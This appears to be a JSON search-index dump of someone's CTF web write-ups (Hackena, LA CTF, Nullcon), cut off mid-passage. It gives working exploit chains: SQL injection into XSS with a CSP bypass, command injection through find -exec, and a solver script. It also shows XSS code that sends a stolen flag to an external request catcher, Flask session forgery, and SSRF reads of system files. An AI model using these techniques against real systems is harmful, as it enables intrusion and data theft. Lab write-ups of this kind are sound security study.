[sum(s[i] * A[i][j] for i in range(n)) % q for j in range(m)]\n        e = [(b[j] - sA[j]) % q for j in range(m)]\n        e_norm = [x if x &lt;= q//2 else x - q for x in e]\n\n        if max(abs(x) for x in e_norm) &lt;= 1:\n            # Decrypt flag\n            key = hashlib.sha256(b\"\".join(\n                int(s[i]).to_bytes(2, \"little\") for i in range(n)\n            )).digest()\n            flag = bytes(enc_flag[i] ^ key[i % len(key)] \n                        for i in range(len(enc_flag)))\n            print(f\"Flag: {flag.decode()}\")\n</code></pre>","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#flag","title":"Flag","text":"<pre><code>Hackena{In_Th3_Re4lm_0f_LLL_JUST_RAAAAAAAAAAAAAAAAAAA}\n</code></pre>","tags":["crypto","hackena"]},{"location":"hackena/smol-web-player/","title":"smol-web-player \u2014 CTF Writeup","text":"<p>Category: Web</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#challenge-overview","title":"Challenge Overview","text":"<p>smol-web-player is a multi-stage web exploitation challenge featuring a retro-themed \"Product Rating System\" built with Flask + SQLite, a Puppeteer admin bot, and a localhost-only file search utility. The goal is to retrieve two flags:</p> Flag Location Technique FLAG 1 SQLite database (<code>products</code> table) SQL Injection FLAG 2 <code>/root/flag.txt</code> (read via SUID binary) SQLi \u2192 XSS \u2192 CSP Bypass \u2192 Bot SSRF \u2192 Command Injection","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#reconnaissance","title":"Reconnaissance","text":"","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#application-structure","title":"Application Structure","text":"<pre><code>smol-web-player/\n\u251c\u2500\u2500 app/\n\u2502   \u251c\u2500\u2500 main.py                  # Flask application\n\u2502   \u251c\u2500\u2500 templates/\n\u2502   \u2502   \u251c\u2500\u2500 base.html            # Base template (green terminal theme)\n\u2502   \u2502   \u251c\u2500\u2500 ratings_page.html    # Product listing (|safe on creator!)\n\u2502   \u2502   \u251c\u2500\u2500 search_page.html     # Localhost-only file finder\n\u2502   \u2502   \u2514\u2500\u2500 report_page.html     # Bot report form\n\u2502   \u2514\u2500\u2500 Dockerfile               # Deploys SUID /readflagbinary\n\u251c\u2500\u2500 bot/\n\u2502   \u251c\u2500\u2500 admin_bot.js             # Puppeteer bot visiting http://web:5000/{uri}\n\u2502   \u2514\u2500\u2500 Dockerfile\n\u2514\u2500\u2500 docker-compose.yml\n</code></pre>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#key-endpoints","title":"Key Endpoints","text":"Route Method Access Purpose <code>/</code> GET Public Product catalog (all products) <code>/ratings?quantity=</code> GET Public Filtered product view \u2014 SQL injectable <code>/report</code> POST Public Submit URL for admin bot to visit <code>/finder</code> GET Localhost only File search UI <code>/search</code> POST Localhost only Executes <code>find</code> command \u2014 command injectable","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#access-control","title":"Access Control","text":"<p>The <code>/finder</code> and <code>/search</code> endpoints are protected by a <code>@localhost_only</code> decorator:</p> <pre><code>def localhost_only(f):\n    @wraps(f)\n    def wrapper(*args, **kwargs):\n        if not ip_address(request.remote_addr).is_private:\n            abort(403)\n        return f(*args, **kwargs)\n    return wrapper\n</code></pre> <p>This checks <code>is_private</code> \u2014 not <code>is_loopback</code>. Any private IP (including Docker internal network addresses like <code>172.x.x.x</code>) passes this check. The admin bot runs in a separate Docker container on the same bridge network, so its requests to <code>http://web:5000</code> originate from a private IP.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#the-suid-binary","title":"The SUID Binary","text":"<p>The Dockerfile reveals a critical setup:</p> <pre><code>RUN echo \"Hackena{t3st_fl4g_12345}\" &gt; /root/flag.txt &amp;&amp; chmod 400 /root/flag.txt\n\nRUN echo '...' &gt; /tmp/readflag.c &amp;&amp; \\\n    gcc -o /readflagbinary /tmp/readflag.c &amp;&amp; \\\n    chmod 4755 /readflagbinary &amp;&amp; \\\n    chown appuser:appuser /app\n</code></pre> <ul> <li>Flag is at <code>/root/flag.txt</code>, readable only by root</li> <li><code>/readflagbinary</code> is a SUID root binary that reads and prints the flag</li> <li>The app runs as <code>appuser</code> \u2014 must execute <code>/readflagbinary</code> to get FLAG 2</li> </ul>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#flag-1-sql-injection","title":"FLAG 1: SQL Injection","text":"","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#vulnerability","title":"Vulnerability","text":"<p>The <code>/ratings</code> endpoint directly interpolates the <code>quantity</code> parameter into a SQL query:</p> <pre><code>quantity = request.args.get(\"quantity\", \"\") or '9'\nif any(c in quantity for c in (\"'\", '\"', \"\\\\\")):\n    quantity = 7\n    flash(\"Warning: Suspicious characters detected.\")\n\nsql = f\"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}\"\n</code></pre> <p>The filter only blocks three characters: <code>'</code>, <code>\"</code>, and <code>\\</code>. Since this is a numeric context, no quotes are needed for injection.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#exploit","title":"Exploit","text":"<p>The FLAG product is stored with <code>quantity=7</code>:</p> <pre><code>INSERT INTO products ... (\"FLAG\", \"Hackena{NUsxTExfMTU1VTM=}\", 7, 1)\n</code></pre> <p>Simply visiting <code>/ratings?quantity=7</code> displays the flag. Alternatively, a UNION injection works:</p> <pre><code>/ratings?quantity=0 UNION SELECT id,name,description,user_id FROM products WHERE name=char(70,76,65,71)\n</code></pre> <p>Using <code>char(70,76,65,71)</code> spells \"FLAG\" without needing quotes.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#flag-1","title":"Flag 1","text":"<pre><code>Hackena{NUsxTExfMTU1VTM=}\n</code></pre> <p>Base64-decoded inner value: <code>5K1LL_155U3</code></p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#flag-2-full-exploit-chain","title":"FLAG 2: Full Exploit Chain","text":"<p>This is a four-stage chain: SQLi \u2192 XSS \u2192 Bot SSRF \u2192 Command Injection</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#stage-1-second-order-sql-injection-xss","title":"Stage 1: Second-Order SQL Injection \u2192 XSS","text":"","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#the-vulnerability","title":"The Vulnerability","text":"<p>In <code>ratings_page.html</code>, the creator field is rendered with the <code>|safe</code> filter, which disables Jinja2's auto-escaping:</p> <pre><code>&lt;td class=\"py-2\"&gt;{{ product.creator|safe }}&lt;/td&gt;\n</code></pre> <p>The <code>creator</code> value comes from a second SQL query that uses the <code>user_id</code> from the first query's results:</p> <pre><code># First query (injectable via quantity)\nsql = f\"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}\"\nrows = db.execute(sql).fetchall()\n\nfor r in rows:\n    # Second query \u2014 user_id from first query is interpolated directly!\n    user_q = f\"SELECT id, name FROM users WHERE id = {r['user_id']}\"\n    user_row = db.execute(user_q).fetchone()\n    user_name = user_row['name']  # \u2190 This gets rendered with |safe\n</code></pre> <p>This creates a second-order SQLi chain: I control <code>user_id</code> via UNION in the first query, and that value is interpolated into the second query, whose output is rendered as raw HTML.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#building-the-injection","title":"Building the Injection","text":"<p>I needed to work in two layers:</p> <p>Layer 1 (quantity parameter): UNION SELECT to control the <code>user_id</code> column: <pre><code>0 UNION SELECT 1, char(65), char(66), char(&lt;layer2_codes&gt;)\n--                  \u2191name    \u2191desc     \u2191user_id (our 2nd-order payload)\n</code></pre></p> <p>Layer 2 (user_id \u2192 user lookup): When the app queries <code>SELECT id, name FROM users WHERE id = &lt;our_value&gt;</code>, our value contains another UNION: <pre><code>0 UNION SELECT 1, char(&lt;xss_html_codes&gt;) --\n--                 \u2191 This becomes the user 'name' \u2192 rendered with |safe\n</code></pre></p> <p>I used <code>char()</code> throughout to avoid needing quotes (which are blocked by the first-level filter).</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#stage-2-csp-bypass-via-youtube-oembed-jsonp","title":"Stage 2: CSP Bypass via YouTube oEmbed JSONP","text":"","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#the-problem","title":"The Problem","text":"<p>The application enforces a strict Content Security Policy:</p> <pre><code>script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com;\n</code></pre> <p>Inline scripts (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) are blocked. I could only load scripts from <code>self</code>, Tailwind CDN, or <code>youtube.com</code>.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#the-bypass","title":"The Bypass","text":"<p>YouTube's oEmbed API supports JSONP via a <code>callback</code> parameter:</p> <pre><code>https://www.youtube.com/oembed?url=http://youtube.com/watch?v=dQw4w9WgXcQ&amp;callback=FUNCTION_NAME\n</code></pre> <p>This returns: <pre><code>FUNCTION_NAME({\"title\":\"...\",\"html\":\"...\",\"provider_name\":\"YouTube\",...})\n</code></pre></p> <p>By setting <code>callback=document.forms[0].submit</code>, the response becomes: <pre><code>document.forms[0].submit({\"title\":\"...\",...})\n</code></pre></p> <p>This calls <code>.submit()</code> on the first form in the DOM \u2014 our injected form! The JSON object passed as an argument is ignored by <code>submit()</code>.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#the-xss-payload","title":"The XSS Payload","text":"<pre><code>&lt;form method=\"POST\" action=\"/search\"&gt;\n  &lt;input name=\"search\" value=\"-exec /?e*y {} ;\"&gt;\n&lt;/form&gt;\n&lt;script src=\"https://www.youtube.com/oembed?url=http://youtube.com/watch?v=dQw4w9WgXcQ&amp;callback=document.forms[0].submit\"&gt;&lt;/script&gt;\n</code></pre> <p>When the bot renders this page: 1. The <code>&lt;form&gt;</code> is created with our command injection payload 2. The YouTube JSONP script loads (allowed by CSP) 3. The callback <code>document.forms[0].submit()</code> fires 4. The form POSTs to <code>/search</code> with our payload</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#stage-3-bot-ssrf-to-localhost-only-endpoint","title":"Stage 3: Bot SSRF to Localhost-Only Endpoint","text":"<p>The admin bot (Puppeteer) visits URLs relative to <code>http://web:5000/</code>:</p> <pre><code>const origin = 'http://web:5000/';\nawait page.goto(origin + uri, { waitUntil: 'networkidle2' });\n</code></pre> <p>The bot's Docker container has a private network IP (e.g., <code>172.18.0.3</code>). When the XSS-injected form submits to <code>/search</code>, the request originates from this private IP, which passes the <code>is_private</code> check in <code>@localhost_only</code>.</p> <p>I triggered the bot via the <code>/report</code> endpoint:</p> <pre><code>requests.post(f\"{TARGET}/report\", data={\"url\": malicious_path})\n</code></pre>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#stage-4-command-injection-via-find","title":"Stage 4: Command Injection via <code>find</code>","text":"","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#the-vulnerability_1","title":"The Vulnerability","text":"<p>The <code>/search</code> endpoint builds a shell command using user input:</p> <pre><code>cmd = f\"find {FILES_DIR} {sanitized_payload}\"\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)\n</code></pre>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#the-sanitizer","title":"The Sanitizer","text":"<pre><code>def sanitize_input(payload):\n    s = str(payload)\n    cmds = ['cc', 'gcc ', 'ex ', 'sleep ']\n\n    # Character blocklist (regex)\n    if re.search(r\"\"\"[&lt;&gt;mhnpdvq$srl+%kowatf123456789'^@\"\\\\]\"\"\", s):\n        return \"Character Not Allowed\"\n\n    # Command blocklist\n    if any(cmd in s for cmd in cmds):\n        return \"Command Not Allowed\"\n\n    # Escape shell metacharacters\n    pattern = re.compile(r'([;&amp;|$\\(\\)\\[\\]&lt;&gt;])')\n    escaped = pattern.sub(r'\\\\\\1', s)\n    return escaped\n</code></pre> <p>Blocked characters: <pre><code>&lt; &gt; m h n p d v q $ s r l + % k o w a t f 1-9 ' ^ @ \" \\\n</code></pre></p> <p>Allowed characters (useful): <pre><code>b c e g i j u x y z 0 - _ . / ? * ~ { } = : ! ` (space) ; \u2192 \\;\n</code></pre></p> <p>Constraints: Max 18 characters.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#crafting-the-payload","title":"Crafting the Payload","text":"<p>I needed to execute <code>/readflagbinary</code>. The <code>find</code> command supports <code>-exec</code>:</p> <pre><code>find ./uploads -exec /readflagbinary {} \\;\n</code></pre> <p>But I couldn't type <code>/readflagbinary</code> directly \u2014 it contains blocked characters (<code>r</code>, <code>a</code>, <code>d</code>, <code>l</code>, <code>f</code>, <code>g</code>, <code>n</code>). I used shell glob patterns instead:</p> <pre><code>/?e*y\n</code></pre> <p>This matches <code>/readflagbinary</code>: - <code>/</code> \u2014 literal slash - <code>?</code> \u2014 matches <code>r</code> (any single char) - <code>e</code> \u2014 literal <code>e</code> - <code>*</code> \u2014 matches <code>adflagbinar</code> (any sequence) - <code>y</code> \u2014 literal <code>y</code></p> <p>Final payload: <code>-exec /?e*y {} ;</code> (16 characters)</p> <p>Why this works with the sanitizer:</p> Character Status <code>-</code> Allowed <code>e</code>, <code>x</code>, <code>c</code> Allowed lowercase letters <code>/</code> Allowed <code>?</code>, <code>*</code> Allowed glob chars <code>{</code>, <code>}</code> Allowed <code>;</code> Escaped to <code>\\;</code> by sanitizer space Allowed <p>The sanitizer escapes <code>;</code> to <code>\\;</code> \u2014 which is exactly what <code>find -exec</code> requires as its terminator. The sanitizer helps us here.</p> <p>Command blocklist check: <code>'ex '</code> is in the blocklist, but our payload contains <code>exec</code> (no trailing space after <code>ex</code>), so it doesn't match.</p> <p>The final executed command: <pre><code>find ./uploads -exec /?e*y {} \\;\n</code></pre></p> <p>This runs <code>/readflagbinary</code> for each file in <code>./uploads</code>, printing the flag to stdout.</p>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#complete-solver-script","title":"Complete Solver Script","text":"<pre><code>#!/usr/bin/env python3\nimport requests, sys, re, urllib.parse\n\nTARGET = sys.argv[1] if len(sys.argv) &gt; 1 else \"http://localhost:5000\"\n\n# \u2500\u2500 FLAG 1: Direct SQLi \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nr = requests.get(f\"{TARGET}/ratings\", params={\"quantity\": \"7\"})\nflag1 = re.search(r'(Hackena\\{[^}]+\\})', r.text)\nprint(f\"FLAG 1: {flag1.group(1)}\" if flag1 else \"FLAG 1: not found\")\n\n# \u2500\u2500 FLAG 2: Full chain \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nCMD = \"-exec /?e*y {} ;\"\n\nxss = (\n    f'&lt;form method=\"POST\" action=\"/search\"&gt;'\n    f'&lt;input name=\"search\" value=\"{CMD}\"&gt;'\n    f'&lt;/form&gt;'\n    f'&lt;script src=\"https://www.youtube.com/oembed'\n    f'?url=http://youtube.com/watch?v=dQw4w9WgXcQ'\n    f'&amp;callback=document.forms[0].submit\"&gt;&lt;/script&gt;'\n)\n\nxss_codes = \",\".join(str(ord(c)) for c in xss)\nlayer2 = f\"0 UNION SELECT 1,char({xss_codes}) --\"\nlayer2_codes = \",\".join(str(ord(c)) for c in layer2)\nsqli = f\"0 UNION SELECT 1,char(65),char(66),char({layer2_codes})\"\n\npath = f\"ratings?quantity={urllib.parse.quote(sqli)}\"\nr = requests.post(f\"{TARGET}/report\", data={\"url\": path}, timeout=20)\nprint(f\"Bot: {r.status_code}\")\n</code></pre>","tags":["web","hackena"]},{"location":"hackena/smol-web-player/#flags","title":"Flags","text":"<pre><code>FLAG 1: Hackena{NUsxTExfMTU1VTM=}\nFLAG 2: Hackena{l0ng_w4y_sm0l_fl4g_W3go_w3G00!!!}\n</code></pre>","tags":["web","hackena"]},{"location":"lactf/","title":"LA CTF","text":"<p>These are my LA CTF web writeups.</p>"},{"location":"lactf/append-note/","title":"Append Note - LA CTF Web Challenge Writeup","text":"<p>Category: Web</p>","tags":["web","lactf"]},{"location":"lactf/append-note/#first-impressions","title":"First Impressions","text":"<p>I was given a Flask web app called \"Append Note\" - it's got this hilariously over-the-top Comic Sans UI with rainbow gradients. Very tongue-in-cheek. But behind the goofy styling there's actually a pretty neat challenge.</p> <p>Opening it up as a regular user, you just get a funny landing page that says reads are \"eventually consistent with the heat death of the universe.\" Cute. But the real action is behind the admin cookie.</p>","tags":["web","lactf"]},{"location":"lactf/append-note/#understanding-the-app","title":"Understanding the App","text":"<p>I started by reading through <code>app.py</code> to figure out what's going on. The app is pretty small - only a few routes:</p> <ul> <li><code>/</code> - Landing page. Shows a form if you're admin, otherwise a joke message.</li> <li><code>/append</code> - The interesting one. Admin-only. Takes a <code>content</code> param and a <code>url</code> param. It checks if any existing note starts with the content you submitted (returning 200 if yes, 404 if no), appends your content to the notes list, then redirects you to the URL you provided.</li> <li><code>/flag</code> - Gives you the flag if you provide the correct <code>secret</code> param. Also has <code>Access-Control-Allow-Origin: *</code> which is important later.</li> </ul> <p>The key thing I noticed: when the app starts, it generates a random 8-character hex string (<code>secrets.token_hex(4)</code>) and drops it into the notes array as the very first entry. If you can figure out that secret, you can hit <code>/flag?secret=&lt;SECRET&gt;</code> and get the flag.</p> <p>So the challenge boils down to: leak the SECRET.</p>","tags":["web","lactf"]},{"location":"lactf/append-note/#finding-the-bug","title":"Finding the Bug","text":"<p>The <code>/append</code> endpoint has a URL validation check:</p> <pre><code>parsed_url = urlparse(redirect_url)\nif (\n    parsed_url.scheme not in [\"http\", \"https\"]\n    or parsed_url.hostname != urlparse(HOST).hostname\n):\n    return f\"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}\", 400\n</code></pre> <p>Two things jumped out at me here:</p> <ol> <li> <p>When the check fails, it reflects <code>parsed_url.scheme</code> and <code>parsed_url.hostname</code> directly into the HTML response with no escaping whatsoever. That's a reflected XSS waiting to happen.</p> </li> <li> <p>Python's <code>urlparse</code> does some interesting stuff with hostnames. I knew it strips tabs, newlines, and carriage returns from hostnames, but I had a hunch it might preserve spaces.</p> </li> </ol> <p>I wrote a quick fuzzer (<code>fuzz_xss.py</code>) to test a bunch of payloads against the local instance. Tried tabs, newlines, various HTML tags - most got stripped by <code>urlparse</code>. But then I tried spaces in the hostname and there it was. <code>urlparse</code> leaves spaces alone, so something like:</p> <pre><code>http://&lt;svg onload=alert(1)&gt;.fake/\n</code></pre> <p>...gets parsed, the hostname check fails (obviously <code>.fake</code> doesn't match the challenge host), and the error message becomes:</p> <pre><code>Invalid redirect URL http &lt;svg onload=alert(1)&gt;.fake\n</code></pre> <p>Boom. The <code>&lt;svg&gt;</code> tag with its <code>onload</code> handler gets reflected straight into the response body. Since the response is <code>text/html</code>, the browser renders it and the JavaScript fires.</p>","tags":["web","lactf"]},{"location":"lactf/append-note/#the-admin-bot","title":"The Admin Bot","text":"<p>Looking at the admin bot code, it's a standard CTF admin bot setup using Puppeteer. It sets an <code>admin</code> cookie on the challenge domain (SameSite: Lax, httpOnly), then visits whatever URL you give it and waits 60 seconds.</p> <p>Since the cookie is SameSite: Lax, a top-level navigation to <code>/append</code> will include it. So if I send the admin bot a crafted URL pointing to <code>/append</code> with my XSS payload in the <code>url</code> parameter, the bot will:</p> <ol> <li>Navigate to the URL with the admin cookie</li> <li>The server validates the cookie (passes) but the URL check fails</li> <li>Our XSS payload gets reflected and executes</li> </ol>","tags":["web","lactf"]},{"location":"lactf/append-note/#building-the-exploit","title":"Building the Exploit","text":"<p>Here's where it gets fun. Once I have XSS running in the admin's browser on the challenge origin, I can make same-origin requests to <code>/append</code> and observe the status codes. Remember:</p> <ul> <li>200 = some existing note starts with the content you submitted</li> <li>404 = no match</li> </ul> <p>The SECRET is 8 hex characters (<code>0-9a-f</code>). So I can brute-force it one character at a time. For each position, I try all 16 hex chars. If <code>/append?content=&lt;guess&gt;</code> returns 200, that prefix exists in the notes and I found the next character. That's at most 8 x 16 = 128 requests. Very doable within the bot's 60-second window.</p> <p>The exploit JS goes in the URL fragment (<code>#...</code>) so it never gets sent to the server. The XSS payload is just <code>&lt;svg onload=eval(location.hash.slice(1))&gt;</code> - super compact, and it pulls the actual exploit code from the fragment.</p> <p>The exploit code itself:</p> <pre><code>(async () =&gt; {\n  const H = '0123456789abcdef';\n  let s = '';\n  for (let i = 0; i &lt; 8; i++) {\n    for (const c of H) {\n      const r = await fetch('/append?content=' + (s + c) + '&amp;url=' + location.origin + '/');\n      if (r.status === 200) { s += c; break; }\n    }\n  }\n  const f = await (await fetch('/flag?secret=' + s)).text();\n  new Image().src = 'https://my.requestcatcher.com/?flag=' + encodeURIComponent(f);\n})()\n</code></pre> <p>It brute-forces the secret character by character, then fetches the flag and exfiltrates it to a request catcher via an image tag. The <code>/flag</code> endpoint having <code>Access-Control-Allow-Origin: *</code> means I can read the response with <code>fetch</code> no problem.</p>","tags":["web","lactf"]},{"location":"lactf/append-note/#putting-it-together","title":"Putting It Together","text":"<p>The final payload URL looks something like:</p> <pre><code>https://challenge-host/append?content=x&amp;url=http%3A%2F%2F%3Csvg%20onload%3Deval(location.hash.slice(1))%3E.fake%2F#(async()=&gt;{...exploit code...})()\n</code></pre> <p>Submit that to the admin bot, wait a few seconds for it to churn through the 128 requests, and the flag shows up on the request catcher.</p>","tags":["web","lactf"]},{"location":"lactf/bobles-and-narnes/","title":"Bobles and Narnes - First-Person Writeup","text":"<p>Category: Web</p>","tags":["web","lactf"]},{"location":"lactf/bobles-and-narnes/#challenge-overview","title":"Challenge Overview","text":"<p>I analyzed a Bun + Express bookstore app where I started with <code>$1000</code>, but the <code>Flag</code> item cost <code>$1,000,000</code>. At first glance, that looked impossible to buy directly.</p> <p>The target behavior was:</p> <ol> <li>Add items to cart via <code>/cart/add</code>.</li> <li>Checkout via <code>/cart/checkout</code>.</li> <li>Receive a ZIP of purchased files.</li> </ol> <p>The key idea was to make the server think the expensive flag item was a sample during the price check, but store it as a full item in the database before checkout.</p>","tags":["web","lactf"]},{"location":"lactf/bobles-and-narnes/#initial-recon","title":"Initial Recon","text":"<p>I reviewed the main backend logic in <code>server.js</code>.</p> <p>Important parts I identified:</p> <ol> <li>Cart schema stores <code>is_sample</code> in <code>cart_items</code> (<code>server.js:40</code>).</li> <li>Price check in <code>/cart/add</code> excludes any product where <code>is_sample</code> is truthy (<code>server.js:138</code>).</li> <li>Cart entries are bulk inserted using <code>await db\\</code>INSERT INTO cart_items ${db(cartEntries)}`<code>(</code>server.js:150`).</li> <li>During checkout, file selection depends on DB <code>item.is_sample</code>; truthy gives <code>*_sample</code>, falsy gives full file (<code>server.js:170</code>).</li> </ol> <p>I also checked frontend behavior in <code>site/main.js</code>:</p> <ol> <li>UI sends <code>is_sample: true/false</code> from button text (<code>site/main.js:56</code>, <code>site/main.js:61</code>).</li> <li>There is no server-side validation that request objects have consistent keys.</li> </ol>","tags":["web","lactf"]},{"location":"lactf/bobles-and-narnes/#root-cause","title":"Root Cause","text":"<p>The exploit comes from a mismatch between:</p> <ol> <li>Price calculation using raw user JSON (<code>productsToAdd</code>) before insert.</li> <li>Bun SQL helper <code>db(cartEntries)</code> inferring insert columns from object keys.</li> </ol> <p>In <code>solve.py</code>, I exploited this by sending two objects in one <code>products</code> array:</p> <ol> <li>First object: cheap book with no <code>is_sample</code> key.</li> <li>Second object: flag book with <code>is_sample: 1</code>.</li> </ol> <p>Because the first object lacks <code>is_sample</code>, the Bun helper builds insert columns without <code>is_sample</code>, so the second object\u2019s <code>is_sample</code> is dropped on insert. That leaves DB rows with <code>is_sample = NULL</code>.</p> <p>Why this works:</p> <ol> <li>Add-time price check:</li> <li>For the flag object, <code>is_sample = 1</code>, so it is treated as sample and excluded from <code>additionalSum</code> (<code>server.js:138</code>).</li> <li>Only the cheap item is charged, so request passes.</li> <li>Checkout-time file selection:</li> <li>Inserted <code>is_sample</code> is <code>NULL</code>, which is falsy.</li> <li>Falsy branch serves the full file (<code>flag.txt</code>) instead of <code>flag_sample.txt</code> (<code>server.js:170</code>).</li> </ol> <p>I confirmed the challenge intentionally includes only <code>books/flag_sample.txt</code>, which contains just <code>lactf{</code>, while the real <code>flag.txt</code> is available remotely through the vulnerable checkout path.</p>","tags":["web","lactf"]},{"location":"lactf/bobles-and-narnes/#exploit-script","title":"Exploit Script","text":"<p>I used the provided <code>solve.py</code>, which does:</p> <ol> <li>Registers a random user.</li> <li>Sends crafted <code>/cart/add</code> JSON with mixed keys.</li> <li>Calls <code>/cart/checkout</code>.</li> <li>Parses returned ZIP and prints file contents.</li> </ol> <p>Critical payload:</p> <pre><code>{\n  \"products\": [\n    {\"book_id\": \"a3e33c2505a19d18\"},\n    {\"book_id\": \"2a16e349fb9045fa\", \"is_sample\": 1}\n  ]\n}\n</code></pre>","tags":["web","lactf"]},{"location":"lactf/bobles-and-narnes/#result","title":"Result","text":"<p>The saved output in <code>out</code> shows successful exploitation:</p> <ol> <li>Remaining balance after add: <code>990</code>.</li> <li>ZIP contained <code>flag.txt</code> and <code>part-time-parliament.pdf</code>.</li> <li><code>flag.txt</code> content was printed directly.</li> </ol> <p>Recovered flag:</p> <p><code>lactf{hojicha_chocolate_dubai_labubu}</code></p>","tags":["web","lactf"]},{"location":"nullconctf/","title":"Nullcon CTF","text":"<p>This section contains my Nullcon CTF writeups.</p>"},{"location":"nullconctf/catboard/","title":"CatBoard \u2014 CTF Web Challenge Writeup","text":"<p>Category: Web</p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#challenge-overview","title":"Challenge Overview","text":"<p>Target: <code>http://52.59.124.14:5004</code> Flag format: <code>ENO{...}</code> Category: Web \u2014 SSRF, Session Forgery, Werkzeug Debugger PIN Bypass</p> <p>The challenge presents \"CatBoard,\" a cat image gallery built with Flask. The source code (<code>app.py</code>) is provided but fully obfuscated \u2014 every Python keyword, identifier, and string literal has been replaced with variations of \"meow\" (<code>mew</code>, <code>meow</code>, <code>meoow</code>, <code>meeeow</code>, etc.).</p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-1-deobfuscating-the-source-code","title":"Step 1: Deobfuscating the Source Code","text":"<p>The obfuscated <code>app.py</code> replaces all tokens with meow variants, but the structure (indentation, parentheses, decorators, operators) is preserved. By analyzing the code structure rather than token names, I identified:</p> <ul> <li>Flask app wrapped in a custom subclass of Werkzeug's <code>DebuggedApplication</code> (with <code>evalex=True</code>, <code>pin_security=True</code>)</li> <li>Secret key: a random word \u226512 characters selected from the <code>RandomWords</code> library</li> <li>Session cookie: Flask signed cookie with an <code>is_admin</code> boolean</li> <li>Routes: <code>/</code> (gallery), <code>/fetch</code> (admin-only SSRF proxy), <code>/vote/&lt;int:id&gt;</code>, <code>/health</code>, <code>/about</code></li> <li>Custom middleware that blocks direct access to <code>/console</code> and fakes <code>pinauth</code> responses</li> </ul> <p>Key finding from the middleware (lines 33\u201369):</p> <pre><code>1. Blocks /console access from non-private IPs\n2. Intercepts __debugger__?cmd=pinauth and always returns {\"auth\": false}\n3. All other requests pass through to the real DebuggedApplication\n</code></pre>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-2-cracking-the-flask-secret-key","title":"Step 2: Cracking the Flask Secret Key","text":"<p>The app generates its secret key with: <pre><code>secret_key = RandomWords().get_random_word(minLength=12)\n</code></pre></p> <p>The <code>RandomWords</code> library ships with a static JSON wordlist at <code>/usr/local/lib/python3.12/dist-packages/random_word/database/words.json</code>. I extracted all 84,104 words with length \u2265 12 and used <code>flask-unsign</code> to bruteforce:</p> <pre><code>flask-unsign --unsign --cookie \"eyJpc19hZG1pbiI6ZmFsc2V9.aYeVwA.5H0-_sIm5Q-J32PcnMTwc6z0aLs\" \\\n  --wordlist wordlist.txt --no-literal-eval\n</code></pre> <p>Secret found after ~7,424 attempts: <code>brownistical</code></p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-3-forging-an-admin-session-cookie","title":"Step 3: Forging an Admin Session Cookie","text":"<p>With the secret key, I forged an admin session:</p> <pre><code>from flask import Flask\nfrom flask.sessions import SecureCookieSessionInterface\n\napp = Flask(__name__)\napp.secret_key = \"brownistical\"\nserializer = SecureCookieSessionInterface().get_signing_serializer(app)\nadmin_cookie = serializer.dumps({\"is_admin\": True})\n</code></pre> <p>This granted access to the admin-only <code>/fetch</code> endpoint, which renders an \"Image Management\" panel with a URL input field backed by <code>pycurl</code>.</p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-4-ssrf-via-the-fetch-endpoint","title":"Step 4: SSRF via the <code>/fetch</code> Endpoint","text":"<p>The admin <code>/fetch</code> endpoint accepts a <code>url</code> parameter and fetches it with <code>pycurl</code>, which supports <code>file://</code>, <code>gopher://</code>, <code>dict://</code>, and other protocols.</p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#information-gathering","title":"Information Gathering","text":"<p>Using <code>file://</code> SSRF, I read critical system files:</p> File Value <code>/etc/machine-id</code> <code>c8f5e9d2a1b3c4d5e6f7a8b9c0d1e2f3</code> <code>/sys/class/net/eth0/address</code> <code>66:73:24:27:39:33</code> <code>/proc/self/environ</code> <code>FLASK_APP=app.py</code>, <code>FLASK_DEBUG=1</code>, <code>HOME=/home/ctfplayer</code>, <code>WERKZEUG_RUN_MAIN=true</code> <code>/proc/self/cgroup</code> <code>0::/</code> <code>/proc/self/mountinfo</code> Docker container ID: <code>9ef8e4a5e852...</code> <code>/proc/self/net/tcp</code> Listening on <code>0.0.0.0:5000</code> 